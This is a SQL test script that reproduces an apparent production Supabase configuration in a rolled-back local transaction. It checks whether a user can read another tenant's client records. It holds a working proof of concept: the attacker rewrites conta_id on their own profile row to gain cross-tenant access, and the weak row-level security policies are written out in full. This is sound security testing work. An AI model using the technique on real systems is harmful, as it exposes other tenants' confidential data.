-- Does production's profiles ACL + legacy policy pair allow cross-tenant reads?
-- Reproduces production's exact configuration on a local DB. Rolled back.
\set ON_ERROR_STOP on
\i supabase/tests/entitlements/_helpers.sql

begin;
select et_grant_hosted_parity();

-- Production's helper: reads profiles.conta_id, no membership check.
create or replace function public.get_user_conta_id() returns uuid
  language sql security definer set search_path to ''
  as $fn$ select conta_id from public.profiles where id = auth.uid(); $fn$;

-- Production's profiles policies: GRANT ALL + UPDATE USING(auth.uid()=id),
-- no WITH CHECK, and the only trigger guards active_workspace_id alone.
drop policy if exists profiles_select_same_workspace on public.profiles;
drop policy if exists profiles_update_own            on public.profiles;
drop policy if exists profiles_insert_self           on public.profiles;
drop policy if exists profiles_no_delete             on public.profiles;
create policy "Users can update own profile" on public.profiles
  for update using (auth.uid() = id);
create policy "Users can view own workspace profiles" on public.profiles
  for select using ((id = auth.uid()) or (conta_id = public.get_my_conta_id()));

-- Production's legacy clientes pair.
drop policy if exists clientes_select on public.clientes;
drop policy if exists clientes_insert on public.clientes;
drop policy if exists clientes_update on public.clientes;
drop policy if exists clientes_delete on public.clientes;
create policy "Users can CRUD own clientes" on public.clientes
  using (auth.uid() = user_id) with check (auth.uid() = user_id);
create policy "Usuários podem gerenciar clientes da sua conta" on public.clientes
  using ((auth.uid() = user_id) or (conta_id = public.get_user_conta_id()))
  with check ((auth.uid() = user_id) or (conta_id = public.get_user_conta_id()));

do $$
declare
  v_attacker_ws uuid;
  v_victim_ws   uuid;
  v_attacker    uuid := gen_random_uuid();
  v_victim      uuid := gen_random_uuid();
  v_before      int;
  v_after       int;
  v_switched    boolean := false;
begin
  v_attacker_ws := et_make_workspace('max');
  v_victim_ws   := et_make_workspace('max');

  insert into auth.users (id) values (v_attacker), (v_victim);
  insert into workspace_members (user_id, workspace_id, role)
    values (v_attacker, v_attacker_ws, 'owner'), (v_victim, v_victim_ws, 'owner');
  update profiles set conta_id = v_attacker_ws, active_workspace_id = v_attacker_ws
   where id = v_attacker;
  update profiles set conta_id = v_victim_ws, active_workspace_id = v_victim_ws
   where id = v_victim;

  -- The victim's private client row. Attacker is NOT a member of victim_ws.
  insert into clientes (nome, sigla, cor, conta_id, user_id, valor_mensal)
    values ('VICTIM CONFIDENTIAL', 'VC', '#000000', v_victim_ws, v_victim, 99999);

  set local role authenticated;
  perform set_config('request.jwt.claims',
    json_build_object('sub', v_attacker, 'role', 'authenticated')::text, true);

  select count(*) into v_before from clientes where conta_id = v_victim_ws;

  -- The attack: rewrite my own tenant selector. One statement, own row only.
  begin
    update profiles set conta_id = v_victim_ws where id = v_attacker;
    v_switched := true;
  exception when others then
    v_switched := false;
  end;

  select count(*) into v_after from clientes where conta_id = v_victim_ws;

  reset role;
  raise notice 'attacker is a member of victim_ws: NO';
  raise notice 'rows visible in victim workspace BEFORE: %', v_before;
  raise notice 'UPDATE profiles SET conta_id = <victim_ws> succeeded: %', v_switched;
  raise notice 'rows visible in victim workspace AFTER:  %', v_after;

  if v_after > 0 then
    raise notice '>>> EXPLOIT CONFIRMED: cross-tenant read without membership <<<';
  else
    raise notice '>>> not exploitable by this path <<<';
  end if;
end $$;

rollback;
